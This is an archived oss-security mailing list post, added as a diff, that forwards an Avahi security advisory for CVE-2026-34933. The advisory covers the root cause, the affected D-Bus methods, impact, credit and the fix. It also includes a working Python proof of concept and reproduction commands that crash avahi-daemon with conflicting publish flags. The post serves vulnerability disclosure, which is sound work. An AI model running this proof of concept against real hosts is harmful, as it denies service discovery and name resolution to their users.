@@ -1,0 +1,273 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Avahi: Reachable assertion in
+ transport_flags_from_domain (CVE-2026-34933)</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="8">[&lt;prev]</a> <a href="10">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;36063a73-4e8a-4e9e-9385-39e908d539a0&#64;oracle.com&gt;
+Date: Sat, 11 Apr 2026 09:56:29 -0700
+From: Alan Coopersmith &lt;alan.coopersmith&#64;...cle.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: Avahi: Reachable assertion in
+ transport_flags_from_domain (CVE-2026-34933)
+
+<a href="https://github.com/avahi/avahi/security/advisories/GHSA-w65r-6gxh-vhvc" rel="nofollow">https://github.com/avahi/avahi/security/advisories/GHSA-w65r-6gxh-vhvc</a> advises:
+&gt; Reachable assertion in transport_flags_from_domain (CVE-2026-34933)
+&gt; 
+&gt; Moderate
+&gt; evverx published GHSA-w65r-6gxh-vhvc Apr 1, 2026
+&gt; 
+&gt; Affected versions: &lt;=v0.9-rc3
+&gt; Patched versions:    v0.9-rc4
+&gt; 
+&gt; Description
+&gt; -----------
+&gt; In all versions up to and including 0.8 and 0.9-rc3, any unprivileged local
+&gt; user can crash avahi-daemon by sending a single D-Bus method call with
+&gt; conflicting publish flags.
+&gt; 
+&gt; The AVAHI_PUBLISH_USE_MULTICAST (0x100) and AVAHI_PUBLISH_USE_WIDE_AREA (0x80)
+&gt; flags are individually accepted by the AVAHI_FLAGS_VALID() validation macro at
+&gt; entry.c:201-209 (for AddRecord) and entry.c:593-597 (for AddService), since
+&gt; both are listed in the allowed flags bitmask. However, these flags are mutually
+&gt; exclusive, and the function transport_flags_from_domain() at entry.c:57 enforces
+&gt; this exclusivity with an assert():
+&gt; 
+&gt; static void transport_flags_from_domain(AvahiServer *s, AvahiPublishFlags *flags, const char *domain) {
+&gt;     assert(flags);
+&gt;     assert(domain);
+&gt; 
+&gt;     assert(!((*flags &amp; AVAHI_PUBLISH_USE_MULTICAST) &amp;&amp; (*flags &amp; AVAHI_PUBLISH_USE_WIDE_AREA)));
+&gt;     // ...
+&gt; }
+&gt; 
+&gt; When both flags are set simultaneously (flags = 0x180), the assertion fails,
+&gt; causing the daemon to abort with SIGABRT. The D-Bus system bus policy
+&gt; (avahi-dbus.conf) allows any local user to call EntryGroupNew and AddService
+&gt; without restrictions.
+&gt; 
+&gt; Root cause
+&gt; ----------
+&gt; The flags validation (AVAHI_FLAGS_VALID) and the mutual exclusivity check
+&gt; (assert in transport_flags_from_domain) are performed at different layers
+&gt; with no coordination:
+&gt; 
+&gt;  1. AVAHI_FLAGS_VALID(flags, mask) checks !(flags &amp; ~mask) -- it verifies that
+&gt;     no unknown bits are set, but does not check for mutually exclusive
+&gt;     combinations.
+&gt;  2. transport_flags_from_domain() enforces mutual exclusivity via assert(),
+&gt;     which is a fatal operation in a production daemon.
+&gt; 
+&gt; Affected D-Bus methods
+&gt; ----------------------
+&gt; The following D-Bus methods on org.freedesktop.Avahi.EntryGroup accept a flags
+&gt; parameter that reaches the vulnerable function:
+&gt; 
+&gt; Method            D-Bus handler            Core function
+&gt; AddService        dbus-entry-group.c:166   server_add_service_strlst_nocopy()
+&gt;                                            -&gt; transport_flags_from_domain()
+&gt; AddServiceSubtype dbus-entry-group.c:213   server_add_service_strlst_nocopy()
+&gt;                                            -&gt; transport_flags_from_domain()
+&gt; AddAddress        dbus-entry-group.c:280   avahi_server_add_address()
+&gt;                                            -&gt; transport_flags_from_domain()
+&gt; AddRecord         dbus-entry-group.c:311   avahi_server_add()
+&gt;                                            -&gt; server_add_internal()
+&gt;                                            -&gt; transport_flags_from_domain()
+&gt; UpdateServiceTxt  dbus-entry-group.c:370   server_update_service_txt_strlst_nocopy()
+&gt;                                            -&gt; transport_flags_from_domain()
+&gt; 
+&gt; Proof of Concept
+&gt; ----------------
+&gt; 
+&gt; #!/usr/bin/env python3
+&gt; """Any local unprivileged user can crash avahi-daemon with this script."""
+&gt; import dbus
+&gt; 
+&gt; AVAHI_PUBLISH_USE_WIDE_AREA = 128   # 0x80
+&gt; AVAHI_PUBLISH_USE_MULTICAST = 256   # 0x100
+&gt; CONFLICTING_FLAGS = AVAHI_PUBLISH_USE_WIDE_AREA | AVAHI_PUBLISH_USE_MULTICAST
+&gt; 
+&gt; bus = dbus.SystemBus()
+&gt; server = dbus.Interface(
+&gt;     bus.get_object('org.freedesktop.Avahi', '/'),
+&gt;     'org.freedesktop.Avahi.Server'
+&gt; )
+&gt; 
+&gt; # Create an entry group
+&gt; eg_path = server.EntryGroupNew()
+&gt; eg = dbus.Interface(
+&gt;     bus.get_object('org.freedesktop.Avahi', eg_path),
+&gt;     'org.freedesktop.Avahi.EntryGroup'
+&gt; )
+&gt; 
+&gt; # Trigger the crash: AddService with both MULTICAST and WIDE_AREA flags
+&gt; eg.AddService(
+&gt;     dbus.Int32(-1),                    # interface (AVAHI_IF_UNSPEC)
+&gt;     dbus.Int32(-1),                    # protocol (AVAHI_PROTO_UNSPEC)
+&gt;     dbus.UInt32(CONFLICTING_FLAGS),    # flags = 0x180 (CRASH)
+&gt;     dbus.String("PoC-Service"),        # name
+&gt;     dbus.String("_http._tcp"),         # type
+&gt;     dbus.String(""),                   # domain
+&gt;     dbus.String(""),                   # host
+&gt;     dbus.UInt16(8080),                 # port
+&gt;     dbus.Array([], signature='ay')     # TXT records
+&gt; )
+&gt; 
+&gt; Reproduction
+&gt; ------------
+&gt; 
+&gt; # On any Linux system with avahi-daemon running:
+&gt; apt install python3-dbus    # if not already installed
+&gt; python3 poc.py
+&gt; 
+&gt; # Verify crash:
+&gt; systemctl status avahi-daemon
+&gt; # Expected: "avahi-daemon.service: Main process exited, code=exited, status=134/n/a"
+&gt; 
+&gt; journalctl -u avahi-daemon -n 5
+&gt; # Expected: "entry.c:57: transport_flags_from_domain: Assertion
+&gt; #   `!((*flags &amp; AVAHI_PUBLISH_USE_MULTICAST) &amp;&amp; (*flags &amp; AVAHI_PUBLISH_USE_WIDE_AREA))' failed."
+&gt; 
+&gt; Impact
+&gt; ------
+&gt; 
+&gt;  * Any unprivileged local user can immediately crash the avahi-daemon process.
+&gt;  * All mDNS/DNS-SD services on the host become unavailable.
+&gt;  * Applications relying on nss-mdns for .local hostname resolution fail.
+&gt;  * Network service discovery (printers, Chromecast, AirPlay, etc.) stops.
+&gt;  * While systemd auto-restarts the daemon, repeated crashes cause a persistent
+&gt;    DoS.
+&gt; 
+&gt; Credit
+&gt; ------
+&gt; Discovered by Guillaume MEUNIER - Head of VOC France - Orange Cyberdefense on
+&gt; 2026-03-10.
+&gt; 
+&gt; Fix
+&gt; ---
+&gt; It was addressed in &lt;<a href="https://github.com/avahi/avahi/pull/891" rel="nofollow">https://github.com/avahi/avahi/pull/891</a>&gt;.
+&gt; 
+&gt; Severity: Moderate - 5.5 / 10
+&gt; CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
+&gt; CVE ID: CVE-2026-34933
+&gt; Weakness: CWE-617
+
+
+-- 
+         -Alan Coopersmith-                 alan.coopersmith&#64;...cle.com
+          Oracle Solaris Engineering - <a href="https://blogs.oracle.com/solaris" rel="nofollow">https://blogs.oracle.com/solaris</a>
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
